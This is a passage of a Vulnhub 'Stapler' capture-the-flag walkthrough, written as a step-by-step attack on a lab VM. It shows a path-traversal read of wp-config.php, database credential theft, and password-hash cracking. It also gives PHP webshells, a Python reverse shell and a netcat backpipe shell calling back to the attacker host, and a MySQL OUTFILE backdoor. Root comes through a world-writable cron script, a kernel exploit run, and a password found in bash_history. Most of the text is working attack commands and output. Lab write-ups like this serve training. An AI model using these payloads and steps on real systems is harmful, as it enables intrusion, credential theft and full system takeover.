sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/bin/false
messagebus:x:108:111::/var/run/dbus:/bin/false
sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
peter:x:1000:1000:Peter,,,:/home/peter:/bin/zsh
mysql:x:111:117:MySQL Server,,,:/nonexistent:/bin/false
RNunemaker:x:1001:1001::/home/RNunemaker:/bin/bash
ETollefson:x:1002:1002::/home/ETollefson:/bin/bash
DSwanger:x:1003:1003::/home/DSwanger:/bin/bash
AParnell:x:1004:1004::/home/AParnell:/bin/bash
SHayslett:x:1005:1005::/home/SHayslett:/bin/bash
MBassin:x:1006:1006::/home/MBassin:/bin/bash
JBare:x:1007:1007::/home/JBare:/bin/bash
LSolum:x:1008:1008::/home/LSolum:/bin/bash
IChadwick:x:1009:1009::/home/IChadwick:/bin/false
MFrei:x:1010:1010::/home/MFrei:/bin/bash
SStroud:x:1011:1011::/home/SStroud:/bin/bash
CCeaser:x:1012:1012::/home/CCeaser:/bin/dash
JKanode:x:1013:1013::/home/JKanode:/bin/bash
CJoo:x:1014:1014::/home/CJoo:/bin/bash
Eeth:x:1015:1015::/home/Eeth:/usr/sbin/nologin
LSolum2:x:1016:1016::/home/LSolum2:/usr/sbin/nologin
JLipps:x:1017:1017::/home/JLipps:/bin/sh
jamie:x:1018:1018::/home/jamie:/bin/sh
Sam:x:1019:1019::/home/Sam:/bin/zsh
Drew:x:1020:1020::/home/Drew:/bin/bash
jess:x:1021:1021::/home/jess:/bin/bash
SHAY:x:1022:1022::/home/SHAY:/bin/bash
Taylor:x:1023:1023::/home/Taylor:/bin/sh
mel:x:1024:1024::/home/mel:/bin/bash
kai:x:1025:1025::/home/kai:/bin/sh
zoe:x:1026:1026::/home/zoe:/bin/bash
NATHAN:x:1027:1027::/home/NATHAN:/bin/bash
www:x:1028:1028::/home/www:
postfix:x:112:118::/var/spool/postfix:/bin/false
ftp:x:110:116:ftp daemon,,,:/var/ftp:/bin/false
elly:x:1029:1029::/home/elly:/bin/bash
```

Before we fire up a brute force attack, we should check to see if there are any other bits of information we can leverage. Reviewing the WP backup, I noticed there is no wp-config.php only wp-config-sample.php. wp-config.php is where an admin can hard code credentials to manage the dB, a dB we might be able to get access to if we can get root password. We know from earlier root login is possible on the dB, lets try and get the details.

Lets create a new 'image' by going to:

https://192.168.56.104:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php

then curling:

``` bash
curl -k https://$STAPLER_IP:12380/blogblog/wp-content/uploads/1006632345.jpeg
```

quick way to refernce only the dB details:

``` bash
curl -k https://$STAPLER_IP:12380/blogblog/wp-content/uploads/1006632345.jpeg | grep "DB"
```
yields root:plbkac as the dB root password

```
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'plbkac');
define('DB_HOST', 'localhost');
define('DB_CHARSET', 'utf8mb4');
define('DB_COLLATE', '');
define('AUTH_SALT',        'I{gDlDs`Z@.+/AdyzYw4%+<WsO-LDBHT}>}!||Xrf@1E6jJNV={p1?yMKYec*OI$');
```

lets try logging in:

``` Bash
mysql -h $STAPLER_IP -u root -pplbkac 
# note no spaces for password!

```
I'm in!

```
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 32
Server version: 5.7.12-0ubuntu1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> 
```

At this point I have value extraction, with access to the database there are many t


lets get the usernames for the WP login:

``` msql
use wordpress;
select user_login,user_pass from wp_users;
```
yeilds: 

```
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| John       | $P$B7889EMq/erHIuZapMB8GEizebcIy9. |
| Elly       | $P$BlumbJRRBit7y50Y17.UPJ/xEgv4my0 |
| Peter      | $P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0 |
| barry      | $P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0 |
| heather    | $P$Bwd0VpK8hX4aN.rZ14WDdhEIGeJgf10 |
| garry      | $P$BzjfKAHd6N4cHKiugLX.4aLes8PxnZ1 |
| harry      | $P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0 |
| scott      | $P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1 |
| kathy      | $P$BZlxAMnC6ON.PYaurLGrhfBi6TjtcA0 |
| tim        | $P$BXDR7dLIJczwfuExJdpQqRsNf.9ueN0 |
| ZOE        | $P$B.gMMKRP11QOdT5m1s9mstAUEDjagu1 |
| Dave       | $P$Bl7/V9Lqvu37jJT.6t4KWmY.v907Hy. |
| Simon      | $P$BLxdiNNRP008kOQ.jE44CjSK/7tEcz0 |
| Abby       | $P$ByZg5mTBpKiLZ5KxhhRe/uqR.48ofs. |
| Vicki      | $P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131 |
| Pam        | $P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0 |
+------------+------------------------------------+
```

Lets condense these down to [wp_users.txt](/assets/vulnhub_stuff/stapler/wp_users.txt) and try to crack the passwords with john the ripper.


``` bash
john wp_users.txt
```

we get some basic passwords from the default configuration:

```
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
ylle             (Elly)
monkey           (harry)
football         (garry)
cookie           (scott)
# then in ASCII mode: 
TOM              (Simon)
```

Brute force cracking based on ASCII string matches will take an age with this system, lets stop here and use the rockyou dictionary:

```
john wp_users.txt -wordlist=/usr/share/wordlists/rockyou.txt
```

As john runs we begin to see passwords pop onto the screen. What we really want is the an account with wp-admin priveleges as this will give us full access to the wp-admin panel, which where we can abuse the site to get a reverse shell. By default the first user in a dB is the admin, if we can get the tool john to get user John's password we will be in a good postion.

And look at that... we got John's password.

```
washere          (barry)
incorrect        (John)
0520             (Pam)
passphrase       (heather)
damachine        (Dave)
partyqueen       (ZOE)
```

lets got to the admin panel and log in https://192.168.56.104:12380/blogblog/wp-admin/

Success! 

![wp-admin.png](/assets/vulnhub_stuff/stapler/wp-admin.png)


At this point we want to try an achieve remote code execution (RCE). 
As John's access is elevated we should have access to themes and plugins. Combine this with the fact that Word Press is served by PhP, 2 options immediately come to mind.

1. Option A: Try to include webshell funtionality in a theme component.
2. Option B: Try to upload a PhP shell as a wordpress plugin.
3. Option C: Try to upload a PhP shell via OUTFILE in the mysql

Any option is potentially valid, but I'm going to try modifying a theme page to include php code. Dropping either of these two following two snippets are a typical go to for code execution on the url:

``` php
<?php echo system($_GET["cmd"].' 2>&1'); ?>
// or
<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
```
I have a through all the themes and can't find a php file I can edit.  
At this point, the plugin is looking like a better option.

If I can upload a php code in a file that launches a reverse shell I might get somewhere.

Luckly Kali comes with a bunch in /usr/share/webshells/php/php-reverse-shell.php

I'll edit the details so I can catch them in a netcat listener:

``` php
$ip = '192.168.56.1';  // CHANGE THIS
$port = 1337;       // CHANGE THIS
```

and upload the file as a plugin 

![evil-plugin.png](/assets/vulnhub_stuff/stapler/evil-plugin.png)

when it asked for the FTP credentials I tried John's again but I recieved an auth error

Going to the uploads directory though, I discover the shell upload succeeded:
https://192.168.56.104:12380/blogblog/wp-content/uploads/


Ok so now we attempt to bounce a shell back to the listner we set up:

``` bash
nc -nvlp 1337
```

and then we visit: https://192.168.56.104:12380/blogblog/wp-content/uploads/php-reverse-shell.php

And nothing! Just a spining web loading page.
If we wait long enough we'll see that we have code execution as the following error gets returned:

``` error
WARNING: Failed to daemonise. This is quite common and not fatal. Connection timed out (110) 
```

At this stage there are a few possibilities to why this failed, my first thoughts are either the box has firewall egress rules in place or I've made an error in my webshell code edits. 

First lets change our shell to a web shell, this way we can perform som active recon as well as try code execution out on the victim.

Open an editor and I put the following code into system-webshell.php:

``` php
<?php echo system($_GET["cmd"].' 2>&1'); ?>

```

I upload as before using John's credentials


![system-webshell.png](/assets/vulnhub_stuff/stapler/system-webshell.png)

and visit:

https://192.168.56.104:12380/blogblog/wp-content/uploads/system-webshell.php


It looks like nothing has happened, but when I call the ls command on the url:

https://192.168.56.104:12380/blogblog/wp-content/uploads/system-webshell.php?cmd=ls

I get:

![web-shell-proof.png](/assets/vulnhub_stuff/stapler/web-shell-proof.png)

Throw a view-source: on to get a better view:

view-source:https://192.168.56.104:12380/blogblog/wp-content/uploads/system-webshell.php?cmd=ls


Ok, so we have execution, lets get a shell.
This time we set it on a port we expect the firewall to allow, 21 (ftp)

``` bash
# we need sudo because 21 is a reserved port
sudo nc -nvlp 21
```

Lets look to see what shells we can use:
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

I tend to have the most success with the python and perl shells when dealing with Linux, lets try the py one first:

https://192.168.56.104:12380/blogblog/wp-content/uploads/system-webshell.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.1",21));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

We get a connection on our listener: 

```
listening on [any] 21 ...
connect to [192.168.56.1] from (UNKNOWN) [192.168.56.104] 58040
/bin/sh: 0: can't access tty; job control turned off
$ 
```

> Bonus backdoor with mysql outfile

while logged into the mysql service you can write a shell to the uploads root with the following:
``` mysql
select “<?php echo shell_exec($_GET[‘cmd’]);?>” into outfile ‘/var/www/https/blogblog/wp-content/uploads/mysql-shell.php’;
```

Execution is as before from the system-webshell.php route. This is riskier as there is no guarantee msql can write to the php executable directories, in this case however it can!

from here lets spawn full bash in our new shell

``` bash
python -c 'import pty; pty.spawn("/bin/bash")'

```

gives us

```
www-data@red:/var/www/https/blogblog/wp-content/uploads$ 
```

We have a good level of control, but we are still missing the easy use of our bash tty setup.

lets fix that, background the shell with Ctl^Z
then in your original terminal forward the settings and restart the backround reverse shell with the following commands

``` bash
stty raw -echo
fg
# note you won't see the fg populate
```

At this point I have access to the system, lets abuse it.

## Enumeration

This is an art in its self, the author of this box also wrote a great starter guide for manual enumeration of linux called [basic-linux-privilege-escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

Going through the steps revels a few ways to get root

## Cronos Master of All Jobs!

Following the guide, poking around the system eventually leads to cron jobs.
the cron.d folder is usually allocated for user defined jobs that don't fit the standard
daily, hourly, monthly or weekly settings. Nothing irregular about that, but always a good place to start our checks
``` bash
ls -la /etc/cron.d/
```

gives

```
total 32
drwxr-xr-x   2 root root  4096 Jun  3  2016 .
drwxr-xr-x 100 root root 12288 Jun  7  2016 ..
-rw-r--r--   1 root root   102 Jun  3  2016 .placeholder
-rw-r--r--   1 root root    56 Jun  3  2016 logrotate
-rw-r--r--   1 root root   589 Jul 16  2014 mdadm
-rw-r--r--   1 root root   670 Mar  1  2016 php
```

checking in the jobs list for executions that are owned by root:

``` bash
cat /etc/cron.d/*
```
gives us an interesting find! A job that runs every 5 min

```
# snip
*/5 *   * * *   root  
# snip
```

what makes this interesting is that /usr/sbin/logrotate is usually the script to rotate logs
not /usr/local/sbin/cron-logrotate.sh.

Also running logrotate every 5 minutes seems excessive for a development site, lets check it out.

``` bash
ls -la /usr/local/sbin/cron-logrotate.sh
```
World writable! And executable!
```
-rwxrwxrwx 1 root root 51 Jun  3  2016 /usr/local/sbin/cron-logrotate.sh
```

lets take a look

``` bash
cat /usr/local/sbin/cron-logrotate.sh 
```

gives:

```
#Simon, you really need to-do something about this
```

Ok, so this means every 5 min root executes the contents of cron-logrotate.sh.
Because this file is world writable all we need to do append a command to the end of it, wait 5 min and it'll execute as root.

While my imagination runs wild with the possibilities, I'll just append a bash reverse shell and wait 5 min.

lets make a reverse shell with msfvenom and create a simple web server for transfer.

I tried a few different variants of shells, from bash to py and to msfvenom payloads but was met with no success. It is difficult to debug this, as we are executing blind and cannot see what is happening in the excution flow.

on a scrape for tools to help I considered nc and telnet backpiping as the execute flag returned this error:

```
nc: invalid option -- 'e'
```

To 'backpipe' a connection we need to make a device node to act as our conduit for the connection.
We then create a network relay to the attacker machine with all of the outputs directed to the device node file. Finally we pipe all of the contents as they are written to the backpipe to a shell, in turn granting code execution  

Fairly standard backpipe shell command looks like this:

``` bash
mknod /tmp/backpipe p; nc 192.168.56.1 1337 0</tmp/backpipe | /bin/bash 1>/tmp/backpipe

```

make a a FIFO (p type) node called backpipe, then open nc connection to the attacker over port 1337, accepting all input from the backpipe file, pipe all stdin from /bin/bash to backpipe.

This command works provided I have a shell execution (which I do), but what if I get into a situation where I lose the shell? I will want make the cron job only open the shell, not create a new node thus a reliable backpipe invocation looks something like: 

``` bash
nc 192.168.56.1 1337 0</tmp/backpipe | /bin/bash 1>/tmp/backpipe
```

lets create the device and pipe the command into the job 

``` bash
mknod /tmp/backpipe p; echo "nc 192.168.56.1 1337 0</tmp/backpipe | /bin/bash 1>/tmp/backpipe" > /usr/local/sbin/cron-logrotate.sh 
```

on the attacker open a listener and wait 5 min:
``` bash
nc -nvlp 1337
```

after a quick cup of hot beverage we catch the shell and run an id:

```
listening on [any] 1337 ...
connect to [192.168.56.1] from (UNKNOWN) [192.168.56.104] 50986
id
uid=0(root) gid=0(root) groups=0(root)
```

we have a root shell, lets upgrade the sh to bash:

``` bash
python -c 'import pty; pty.spawn("/bin/bash")'

```

get the flag
``` bash
sudo cat /root/flag.txt
```

W00tW00t!

```
~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)  
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b
```

## Kernel Busting!

With aging boxes, kernel smashing can be a quick win. This case it's no different, start by getting the full version info

``` bash
uname -a
```
Shows us
```
Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux
```

A little digging with searchsploit and we have a few contenders.
``` bash
searchsploit 4.4 linux kernel
```

```
---------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                    |  Path
                                                                                  | (/usr/share/exploitdb/)
---------------------------------------------------------------------------------- ----------------------------------------
Linux Kernel 2.4.4 < 2.4.37.4 / 2.6.0 < 2.6.30.4 - 'Sendpage' Local Privilege Esc | exploits/linux/local/19933.rb
Linux Kernel 2.6 < 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86)  | exploits/linux_x86/local/9542.c
Linux Kernel 3.10/3.18 /4.4 - Netfilter IPT_SO_SET_REPLACE Memory Corruption      | exploits/linux/dos/39545.txt
Linux Kernel 4.4 (Ubuntu 16.04) - 'BPF' Local Privilege Escalation (Metasploit)   | exploits/linux/local/40759.rb
Linux Kernel 4.4 (Ubuntu 16.04) - 'snd_timer_user_ccallback()' Kernel Pointer Lea | exploits/linux/dos/46529.c
Linux Kernel 4.4 - 'rtnetlink' Stack Memory Disclosure                            | exploits/linux/local/46006.c
Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Condition Privi | exploits/linux_x86-64/local/40871.c
Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free (PoC)                              | exploits/linux/dos/41457.c
Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free Privilege Escalation               | exploits/linux/local/41458.c
Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter target_offset Out-of-Bounds  | exploits/linux_x86-64/local/40049.c
Linux Kernel 4.4.1 - REFCOUNT Overflow Use-After-Free in Keyrings Local Privilege | exploits/linux/local/39277.c
Linux Kernel 4.4.1 - REFCOUNT Overflow Use-After-Free in Keyrings Local Privilege | exploits/linux/local/40003.c
Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege | exploits/linux/local/39772.txt
Linux Kernel < 3.4.5 (Android 4.2.2/4.4 ARM) - Local Privilege Escalation         | exploits/arm/local/31574.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation            | exploits/linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Priv | exploits/linux/local/44300.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escal | exploits/linux/local/43418.c
---------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
Papers: No Result
```
closer look at Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escal
``` bash
searchsploit -x 43418.c
```

This almost looks promising as it includes KASLR and SMEP bypasses, but no SMAP bypass.

Kernel Address Space Layout Randomization (KASLR) randomizes where the kernel code is placed at boot time, making it near impossible to overflow memory with hard coded memory locations. Covering this in the exploit shows the devleoper has a matured the exploit to work outside a PoC Lab.


Supervisor Mode Access Prevention (SMAP) is designed to complement Supervisor Mode Execution Prevention (SMEP), SMEP can be used to prevent supervisor mode from unintentionally executing user-space code, SMAP extends this protection to reads and writes.

Bit risky, lets look elsewhere: Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege

``` bash
searchsploit -x 39772
```

first pre-req is that CONFIG_BPF_SYSCALL is set to true.
Quick google shows this should be located here: /boot/config-4*

lets check:

``` bash
cat /boot/config-4.4.0-21-generic | grep CONFIG_BPF_SYSCALL
```

yaas!

```
CONFIG_BPF_SYSCALL=y
```

Next we need to check sysctl to make sure kernel.unprivileged_bpf_disabled is 0

``` bash
sysctl -a | grep kernel.unprivileged_bpf_disabled
```

It is!

```
sysctl: permission denied on key 'fs.protected_hardlinks'
sysctl: permission denied on key 'fs.protected_symlinks'
sysctl: permission denied on key 'kernel.cad_pid'
kernel.unprivileged_bpf_disabled = 0
sysctl: permission denied on key 'kernel.unprivileged_userns_apparmor_policy'
sysctl: permission denied on key 'kernel.usermodehelper.bset'
sysctl: permission denied on key 'kernel.usermodehelper.inheritable'
sysctl: permission denied on key 'net.ipv4.tcp_fastopen_key'
sysctl: permission denied on key 'net.ipv6.conf.all.stable_secret'
sysctl: permission denied on key 'net.ipv6.conf.default.stable_secret'
sysctl: permission denied on key 'net.ipv6.conf.enp0s3.stable_secret'
sysctl: permission denied on key 'net.ipv6.conf.lo.stable_secret'
```

This looks a little more solid and has an off system link to PoC code, lets get it

``` bash
wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
sudo python -m SimpleHTTPServer 80
```

on our victim, lets pull the exploit over with wget

TODO

this! With outputs
``` bash
wget http://192.168.56.1/39772.zip 
unzip 39772.zip && cd 39772
```
outputs the tools:
```
Archive:  39772.zip
   creating: 39772/
  inflating: 39772/.DS_Store         
   creating: __MACOSX/
   creating: __MACOSX/39772/
  inflating: __MACOSX/39772/._.DS_Store  
  inflating: 39772/crasher.tar       
  inflating: __MACOSX/39772/._crasher.tar  
  inflating: 39772/exploit.tar       
  inflating: __MACOSX/39772/._exploit.tar  
```
Lets unpack the exploit:
``` bash
tar -xvf exploit.tar && cd ebpf_mapfd_doubleput_exploit
```
gives us
```
ebpf_mapfd_doubleput_exploit/
ebpf_mapfd_doubleput_exploit/hello.c
ebpf_mapfd_doubleput_exploit/suidhelper.c
ebpf_mapfd_doubleput_exploit/compile.sh
ebpf_mapfd_doubleput_exploit/doubleput.c
```
and compile:
``` bash
bash compile.sh
```
returns some minor errors
```
doubleput.c: In function 'make_setuid':
doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .insns = (__aligned_u64) insns,
             ^
doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .license = (__aligned_u64)""
               ^
<ontent/uploads/39772/ebpf_mapfd_doubleput_exploit$ ls
compile.sh  doubleput  doubleput.c  hello  hello.c  suidhelper	suidhelper.c

```
We don't care! Time to pwn!
``` bash
./doubleput
```

It is working

```
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
suid file detected, launching rootshell...
we have root privs now...
```

I AM ROOT!
``` bash
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
``` 

get the flag
``` bash
sudo cat /root/flag.txt
```

W00tW00t!

```
~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)  
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b
```

## Poor Peter!
A little trick I learned from Hack the box is always check to see if you can read the user histories before you do anything. A handy password parsed into a command might just give us a quick way to a user account.

``` bash
cat /home/*/.bash_history > history.txt
```
executes fine with one deny

```
cat: /home/peter/.bash_history: Permission denied
```

peter must be the admin, as he's the only protected account, lets see if there are any goodies:

![history.png](/assets/vulnhub_stuff/stapler/history.png)


peter's ssh login password! JZQuyIN5

lets be peter 

``` bash
su peter
JZQuyIN5
```

Success!

```
This is the Z Shell configuration function for new users,
zsh-newuser-install.
You are seeing this message because you have no zsh startup files
(the files .zshenv, .zprofile, .zshrc, .zlogin in the directory
~).  This function can help you with a few settings that should
make your use of the shell easier.

You can:

(q)  Quit and do nothing.  The function will be run again next time.

(0)  Exit, creating the file ~/.zshrc containing just a comment.
     That will prevent this function being run again.

(1)  Continue to the main menu.

(2)  Populate your ~/.zshrc with the configuration recommended
     by the system administrator and exit (you will need to edit
     the file by hand, if so desired).

--- Type one of the keys in parentheses --- 
```

My zsh is not so good, I select 0 to drop to a vanilla shell.

pop a bash prompt:
```bash
bash
```
lets check if the hunch is right and we have admin:
``` bash
sudo -l
```
prompts us for peter's password
```
We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for peter: 
```
Enter it to find out we have full sudo!

```
Matching Defaults entries for peter on red:
    lecture=always, env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User peter may run the following commands on red:
    (ALL : ALL) ALL
```

lets get the flag!

```
sudo ls -la /root
```

```
total 208
drwx------  4 root root  4096 Aug 25 21:59 .
drwxr-xr-x 22 root root  4096 Jun  7  2016 ..
-rw-------  1 root root     1 Jun  5  2016 .bash_history
-rw-r--r--  1 root root  3106 Oct 22  2015 .bashrc
-rwxr-xr-x  1 root root  1090 Jun  5  2016 fix-wordpress.sh
-rw-r--r--  1 root root   463 Jun  5  2016 flag.txt
-rw-r--r--  1 root root   345 Jun  5  2016 issue
-rw-r--r--  1 root root    50 Jun  3  2016 .my.cnf
-rw-------  1 root root     1 Jun  5  2016 .mysql_history
drwxr-xr-x 11 root root  4096 Jun  3  2016 .oh-my-zsh
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
-rwxr-xr-x  1 root root   103 Jun  5  2016 python.sh
-rw-------  1 root root  1024 Jun  5  2016 .rnd
drwxr-xr-x  2 root root  4096 Jun  4  2016 .vim
-rw-------  1 root root     1 Jun  5  2016 .viminfo
-rw-r--r--  1 root root 54405 Jun  5  2016 wordpress.sql
-rw-r--r--  1 root root 39206 Jun  3  2016 .zcompdump
-rw-r--r--  1 root root 39352 Jun  3  2016 .zcompdump-red-5.1.1
-rw-------  1 root root    39 Jun  5  2016 .zsh_history
-rw-r--r--  1 root root  2839 Jun  3  2016 .zshrc
-rw-r--r--  1 root root    17 Jun  3  2016 .zsh-update
```
get the flag
``` bash
sudo cat /root/flag.txt
```

W00tW00t!

```
~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)  
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b
```